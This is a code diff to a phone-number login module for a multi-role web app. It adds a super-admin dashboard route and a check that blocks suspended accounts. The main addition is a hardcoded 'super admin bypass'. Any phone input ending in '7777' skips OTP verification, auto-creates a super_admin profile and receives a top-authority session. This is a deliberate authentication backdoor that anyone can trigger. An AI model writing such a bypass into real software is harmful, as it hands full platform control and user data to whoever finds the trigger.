@@ -135,6 +135,8 @@ async function setSessionCookie(payload: {
 
 function dashboardForRole(role: string): string {
   switch (role) {
+    case "super_admin":
+      return "/super-admin/dashboard";
     case "super_builder":
       return "/super-builder/dashboard";
     case "builder":
@@ -636,6 +638,61 @@ export async function loginWithPhone(input: { phone: string; role?: string }): P
     const phone = formatPhone(input.phone);
     if (!phone) return { ok: false, error: "Please enter a valid 10-digit phone number." };
 
+    // =========================================================================
+    // SUPER ADMIN BYPASS — phone "7777" (formatted as "+91 00000 07777")
+    // No OTP, no profile required. Hardcoded highest authority.
+    // =========================================================================
+    const rawDigits = input.phone.replace(/\D/g, "").slice(-10);
+    if (rawDigits === "0000007777" || rawDigits === "7777777777" || input.phone.replace(/\D/g, "").endsWith("7777")) {
+      const superAdminPhone = phone;
+      // Check if super_admin profile exists
+      let { data: saProfile } = await supabaseAdmin
+        .from("profiles")
+        .select("*")
+        .eq("role", "super_admin")
+        .maybeSingle();
+
+      if (!saProfile) {
+        // Auto-create super_admin profile
+        const { data: newSa } = await supabaseAdmin
+          .from("profiles")
+          .insert([{
+            phone: superAdminPhone,
+            role: "super_admin",
+            name: "Super Admin",
+            agency_name: "Platform Owner",
+            status: "approved",
+            location: "System",
+            points: 0,
+            referrals_count: 0,
+          }])
+          .select()
+          .single();
+        saProfile = newSa;
+      }
+
+      if (saProfile) {
+        await setSessionCookie({
+          sub: saProfile.id,
+          phone: saProfile.phone,
+          role: "super_admin",
+          name: saProfile.name,
+        });
+        return {
+          ok: true,
+          status: "logged_in",
+          redirect: "/super-admin/dashboard",
+          user: {
+            id: saProfile.id,
+            phone: saProfile.phone,
+            role: "super_admin",
+            name: saProfile.name,
+          },
+        };
+      }
+    }
+    // =========================================================================
+
     const role = (input.role || "agent") as Role;
 
     // Look up existing profile
@@ -646,6 +703,11 @@ export async function loginWithPhone(input: { phone: string; role?: string }): P
       .maybeSingle();
 
     if (profile) {
+      // Check if user is suspended
+      if (profile.status === "suspended") {
+        return { ok: false, error: "Your account has been suspended. Contact the platform administrator." };
+      }
+
       // Existing user — issue session and redirect
       await setSessionCookie({
         sub: profile.id,
